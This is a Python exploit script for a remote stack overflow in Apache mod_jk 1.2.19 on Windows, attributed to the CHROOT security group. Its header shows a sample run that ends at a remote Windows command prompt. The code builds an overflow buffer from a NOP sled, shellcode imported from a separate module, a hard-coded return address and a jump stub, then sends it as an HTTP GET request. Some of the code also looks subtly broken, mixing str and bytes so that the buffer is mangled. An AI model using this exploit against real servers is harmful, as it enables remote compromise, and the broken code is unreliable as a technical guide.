#!/usr/bin/python
#
#   _____ _   _ _____  _____ _____ _____
#  /  ___| |_| |  _  \|  _  |  _  |_   _|
#  | (___|  _  | [_)_/| (_) | (_) | | |
#  \_____|_| |_|_| |_||_____|_____| |_|
#         C. H. R. O. O. T.  SECURITY  GROUP
#         - -- ----- --- -- -- ---- --- -- -
#                      http://www.chroot.org
#
#                          _   _ _ _____ ____ ____ __  _ 
#        Hacks In Taiwan  | |_| | |_   _|  __|    |  \| |
#        Conference 2008  |  _  | | | | | (__| () |     |
#                         |_| |_|_| |_| \____|____|_|\__|
#                                      http://www.hitcon.org
#
#
#  Title =======:: Apache (mod_jk) 1.2.19 Remote Stack Overflow Exploit
#
#  Author ======:: unohope [at] chroot [dot] org
#
#  IRC =========:: irc.chroot.org #chroot
#
#  ScriptName ==:: Apache Module mod_jk/1.2.19
#
#  Vendor ======:: http://tomcat.apache.org/
#
#  Download ====:: http://archive.apache.org/dist/tomcat/tomcat-connectors/jk/binaries/win32/
#
#  Tested on ===:: Apache/2.0.58 (Win32) mod_jk/1.2.19
#                  Apache/2.0.59 (Win32) mod_jk/1.2.19
#
#  Greets ======:: zha0
#
#
#  [root@wargame tmp]# ./apx-jk_mod-1.2.19
#  Apache (mod_jk) 1.2.19 Remote Stack Overflow Exploit (unohope@chroot.org)
#
#  usage: ./apx-jk_mod-1.2.19 <host>
#
#  [root@wargame tmp]# ./apx-jk_mod-1.2.19 192.168.1.78
#  Apache (mod_jk) 1.2.19 Remote Stack Overflow Exploit (unohope@chroot.org)
#
#    [+] connecting to 192.168.1.78 ...
#
#  Trying 192.168.1.78...
#  Connected to 192.168.1.78.
#  Escape character is '^]'.
#  Microsoft Windows XP [.. 5.1.2600]
#  (C) Copyright 1985-2001 Microsoft Corp.
#
#  C:\AppServ\Apache2>
#
#




import socket
from payload import buf
import sys
def shell_attack(target_machine, target_port):

  foo_base = 8
  buf_base = 4087
  buf_offset = foo_base * 11
  nop = b"\x90"
  ret = b"\xcc\x2a\xd9\x77"
  buffer = nop*foo_base + buf + nop*(buf_base - foo_base - len(buf) - buf_offset) + ret
  buffer += b"\x90\x90\xb0\x53\x6b\xC0\x28\x03\xd8\xff\xd3" + nop*(buf_offset - foo_base - 3)
  host = target_machine
  port = target_port




  try:
    sockaddr = (host, port)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    payload = str(buffer) + 'HTTP/1.0\r\nHost: %s\r\n\r\n\0' % host
    
    s.connect(sockaddr)
    
    s.send(b'GET /' + payload)
    s.close()
  except:
    print('  [-] EXPLOIT FAILED!\n')
  
  
 




